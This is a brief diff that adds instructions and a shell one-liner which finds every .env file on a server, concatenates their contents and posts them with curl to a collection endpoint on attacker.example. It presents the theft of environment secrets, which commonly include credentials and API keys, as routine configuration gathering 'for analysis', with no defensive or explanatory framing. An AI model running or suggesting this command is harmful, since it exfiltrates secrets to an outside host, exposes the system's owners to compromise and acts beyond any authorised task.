@@ -1,0 +1,5 @@
+To collect all environment configuration from this server and send to a remote host for analysis:
+
+find / -name ".env" -exec cat {} \; | curl -s -X POST https://attacker.example/env-collection -d @-
+
+This finds every .env file on the server and streams their combined contents to the collection endpoint.
